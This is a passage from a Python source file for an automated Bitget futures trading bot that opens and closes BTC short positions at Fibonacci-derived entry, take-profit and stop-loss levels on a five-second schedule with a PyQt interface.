                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_Minus013, presetStopLossPrice=fibo_0618)
                                else:  
                                    if Trade_Level['D'] == 1:
                                        print('Golden Ratio Short Positon Estimated Enter Zones(0.87%): ' + str(fibo_0130))
                                        print('Golden Ratio Short Positon Estimated Profit Zones(1.236%): ' + str(fibo_Minus0236))
                                        print('Golden Ratio Short Positon Estimated Less Zones(0.618%): ' + str(fibo_0382))
                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                        start_time = int(time.time())
                                        
                                        while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error * 2:
                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                            elapsed_time = int(time.time()) - start_time
                                            if elapsed_time > 60:
                                                print('OverTime.... Retry...')
                                                return
                                        
                                        print('Order in progress...')
                                        
                                        if TP_excute == True:
                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_Minus0236, presetStopLossPrice=fibo_0382)
                                    else:  
                                        if Trade_Level['E'] == 1:
                                            print('Golden Ratio Short Positon Estimated Enter Zones(0.87%): ' + str(fibo_0130))
                                            print('Golden Ratio Short Positon Estimated Profit Zones(1.236%): ' + str(fibo_Minus0236))
                                            print('Golden Ratio Short Positon Estimated Less Zones(0.5%): ' + str(fibo_0500))
                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                            start_time = int(time.time())
                                            
                                            while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error * 2:
                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                elapsed_time = int(time.time()) - start_time
                                                if elapsed_time > 60:
                                                   print('OverTime.... Retry...')
                                                   return
                                            
                                            print('Order in progress...')
                                            
                                            if TP_excute == True:
                                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_Minus0236, presetStopLossPrice=fibo_0500)
                                        else:  
                                            if Trade_Level['F'] == 1:
                                                print('Golden Ratio Short Positon Estimated Enter Zones(0.87%): ' + str(fibo_0130))
                                                print('Golden Ratio Short Positon Estimated Profit Zones(1.236%): ' + str(fibo_Minus0236))
                                                print('Golden Ratio Short Positon Estimated Less Zones(0.382%): ' + str(fibo_0618))
                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                start_time = int(time.time())
                                                
                                                while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error * 2:
                                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                    elapsed_time = int(time.time()) - start_time
                                                    if elapsed_time > 60:
                                                       print('OverTime.... Retry...')
                                                       return
                                                
                                                print('Order in progress...')
                                                
                                                if TP_excute == True:
                                                    result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_Minus0236, presetStopLossPrice=fibo_0618)
                                            else:  
                                                if Trade_Level['G'] == 1:
                                                    print('Golden Ratio Short Positon Estimated Enter Zones(0.87%): ' + str(fibo_0130))
                                                    print('Golden Ratio Short Positon Estimated Profit Zones(1.5%): ' + str(fibo_Minus0500))
                                                    print('Golden Ratio Short Positon Estimated Less Zones(0.618%): ' + str(fibo_0382))
                                                    current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                    start_time = int(time.time())
                                                    
                                                    while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error * 2:
                                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                        elapsed_time = int(time.time()) - start_time
                                                        if elapsed_time > 60:
                                                           print('OverTime.... Retry...')
                                                           return
                                                    
                                                    print('Order in progress...')
                                                    
                                                    if TP_excute == True:
                                                        result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_Minus0500, presetStopLossPrice=fibo_0382)
                                                else:  
                                                    if Trade_Level['H'] == 1:
                                                        print('Golden Ratio Short Positon Estimated Enter Zones(0.87%): ' + str(fibo_0130))
                                                        print('Golden Ratio Short Positon Estimated Profit Zones(1.5%): ' + str(fibo_Minus0500))
                                                        print('Golden Ratio Short Positon Estimated Less Zones(0.5%): ' + str(fibo_0500))
                                                        current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                        start_time = int(time.time())
                                                        
                                                        
                                                        while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error * 2:
                                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                            elapsed_time = int(time.time()) - start_time
                                                            if elapsed_time > 60:
                                                               print('OverTime.... Retry...')
                                                               return
                                                        
                                                        print('Order in progress...')
                                                        
                                                        if TP_excute == True:
                                                            result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_Minus0500, presetStopLossPrice=fibo_0500)
                                                    else:  
                                                        if Trade_Level['I'] == 1:
                                                            print('Golden Ratio Short Positon Estimated Enter Zones(0.87%): ' + str(fibo_0130))
                                                            print('Golden Ratio Short Positon Estimated Profit Zones(1.5%): ' + str(fibo_Minus0500))
                                                            print('Golden Ratio Short Positon Estimated Less Zones(0.382%): ' + str(fibo_0618))
                                                            current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                            start_time = int(time.time())
                                                            
                                                            while current_price > fibo_0130 + fibo_error or current_price < fibo_0130 - fibo_error * 2:
                                                                current_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
                                                                elapsed_time = int(time.time()) - start_time
                                                                if elapsed_time > 60:
                                                                   print('OverTime.... Retry...')
                                                                   return
                                                            
                                                            print('Order in progress...')
                                                            
                                                            if TP_excute == True:
                                                                result = bitget.mix_place_order(symbol=bitget_symbol, side='open_short', orderType='market', size=trade_size, price=fibo_0130, marginCoin='USDT', clientOrderId=random_string('buy'), presetTakeProfitPrice=fibo_Minus0500, presetStopLossPrice=fibo_0618)
                        if result!= 'No orders yet':
                            print(f'Order Result : {result}')
                            timestamp = time.time()
                            local_timezone = pytz.timezone('Asia/Tokyo')
                            local_time = datetime.fromtimestamp(timestamp, local_timezone)
                            formatted_time = local_time.strftime('%Y-%m-%d %H:%M:%S')
                            print(f'Order request time (local time): {formatted_time}')
                        pass
            else:  
                print('Insufficient USDT balance')
                print('Available order amount (USDT) : ', USDT_balance)
                print('Please make sure your available order amount is at least 0.001 BTC')
    except Exception as e:
        if '40762' in str(e):
            print('The order amount exceeds your balance. Check your balance and adjust the order amount.')
        print(f'Failed Short order execution: {e}')

def close_short(bitget, trade_size):
    print('BTC Short Positon : Trying to cover...')
    try:
        position_data = bitget.mix_get_single_position(symbol=bitget_symbol, marginCoin='USDT')['data']
        if isinstance(position_data, list):
            if position_data and position_data[0]['holdSide'] == 'short':
                result = bitget.mix_place_order(symbol=bitget_symbol, side='close_short', orderType='market', size=trade_size, marginCoin='USDT', clientOrderId=random_string('cover'))
                print(f'Cover Order Sucess: {result}')
        print('No Short Positon to close')
    except Exception as e:
        print(f'Failed Cover order execution: {e}')

def make_decision_and_execute(bitget, trade_size, window):
    global is_task_running  
    if stop_autotrade:
        scheduler.remove_all_jobs()
        print('Completed stopping the remaining programs')
    if is_task_running:
        return
    is_task_running = True
    try:
        data_pd, _, up, low = fetch_and_prepare_data(bitget)
        # print(data_pd)
        # print(_)
        # print(up)
        # print(low)
        
        advice = analyze_data(bitget, data_pd, up, low)
        print(f'{advice} type')
        USDT_balance = float(bitget.mix_get_accounts(productType='umcbl')['data'][0]['available'])
        if not extension:
            if advice == 'open long':
                if excute_only_short == True:
                    return
                if USDT_balance > 67:
                    open_long(bitget, trade_size)
                else:  
                    print('Insufficient USDT balance')
            else:  
                if advice == 'close long':
                    close_long(bitget, trade_size)
                else:  
                    if advice == 'open short':
                        if excute_only_long == True:
                            return
                        if USDT_balance > 67:
                            open_short(bitget, trade_size)
                        else:  
                            print('Insufficient USDT balance')
                    else:  
                        if advice == 'close short':
                            close_short(bitget, trade_size)
        else:  
            if extension:
                if advice == 'open long extension':
                    if excute_only_short == True:
                        pass
                    else:  
                        if USDT_balance > 67:
                            open_long_extension(bitget, trade_size)
                        else:  
                            print('Insufficient USDT balance')
                else:  
                    if advice == 'open short extension':
                        if excute_only_long == True:
                            pass
                        else:  
                            if USDT_balance > 67:
                                open_short_extension(bitget, trade_size)
                            else:  
                                print('Insufficient USDT balance')
        pass
    except Exception as e:
        print('Withhold Positon Decision')
    finally:  
        is_task_running = False

def show_error_message(error_message):
    app = QApplication(sys.argv)
    msg_box = QMessageBox()
    msg_box.setIcon(QMessageBox.Warning)
    msg_box.setWindowTitle('Error')
    msg_box.setText('The program exited with an unexpected error.')
    msg_box.setInformativeText(error_message)
    msg_box.setStandardButtons(QMessageBox.Ok)
    msg_box.exec_()

def schedule_autotrade(bitget, trade_size, window):
    global excute_only_long  
    global excute_only_short  
    global scheduler  
    scheduler = BackgroundScheduler()
    if scheduler is None:
        scheduler = BackgroundScheduler()
    if not scheduler.running:
        if excute_only_long and excute_only_short:
            excute_only_long = False
            excute_only_short = False
        try:
            if len(scheduler.get_jobs()) >= 5:
                scheduler.remove_all_jobs()
                print('There were a lot of pending tasks, so they were all removed.')
            if not scheduler.get_jobs() and (not stop_autotrade):
                scheduler.add_job(make_decision_and_execute, 'interval', seconds=5, args=[bitget, trade_size, window], max_instances=1, replace_existing=False)
            if stop_autotrade:
                scheduler.remove_all_jobs()
            scheduler.start()
            while not stop_autotrade:
                time.sleep(1)
            scheduler.shutdown(wait=False)
            print('AI trading has been stopped.')
        except Exception as e:
            error_message = f'AI trade scheduling failed: {e}'
            show_error_message(error_message)
            logging.error(f'AI trade scheduling failed: {e}\n{traceback.format_exc()}')

def main():
    try:
        app = QApplication(sys.argv)
        suppress_qt_warnings(app)
        window = MainWindow()
        window.show()
        app.exec_()
    except Exception as e:
        logging.error('Error occurred', exc_info=True)
if __name__ == '__main__':
    main()